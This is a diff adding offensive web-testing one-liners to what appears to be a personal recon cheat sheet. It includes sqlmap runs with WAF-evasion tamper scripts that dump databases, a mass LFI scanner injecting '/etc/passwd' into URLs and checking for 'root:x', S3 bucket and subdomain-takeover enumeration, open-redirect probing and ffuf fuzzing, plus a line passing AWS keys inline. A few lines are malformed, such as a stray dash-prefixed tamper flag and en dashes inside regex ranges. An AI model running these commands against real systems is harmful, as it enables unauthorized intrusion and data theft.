@@ -3,12 +3,33 @@
 
 
 
+awk 'FNR==NR {a[$0]++; next} !($0 in a)' test.txt test2.txt
 
+AWS_ACCESS_KEY_ID=ABCD AWS_SECRET_ACCESS_KEY=EF1234 aws ec2 describe-instances
 
+ffuf -w js_files.txt -u FUZZ -mr "sourceMappingURL"
 
+grep name | tr -d ' ' | awk -F: '{print$2}' | grep -v null | sed 's/\"//g' | sed 's/\,//g' | sort -u
 
+sqlmap -m sqli --dbs --batch
+--level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
+— tamper=space2hash 
 
+sqlmap -u sitedotcom/?id=3  --dbs --batch --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,ifnull2ifisnull,modsecurityversioned
 
+grep  "https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)"
+
+for i in $( cat alive.txt ); do curl -s "$i.s3.amazonaws.com/" | grep -v "xml version" | grep -v "NoSuchBucket" && echo "$i" ; done
+
+for i in $( cat alive.txt | awk -F "//" '{print $2}' ); do dig $i | grep CNAME ; done
+
+gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+gf lfi | qsreplace FUZZ | tee -a url | while read url; do ffuf -w word -u "$url"  -c=true -sa=true  -sf=true -se=true -mc=302  -v 2>/dev/null ; done
+
+cat wayb/redirect.txt | qsreplace "http://localhost" | tee -a open.txt
+
+grep -o -E "(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+"
 
 grep -oiahE "https?://[^\"\\'> ]+\.js"
 
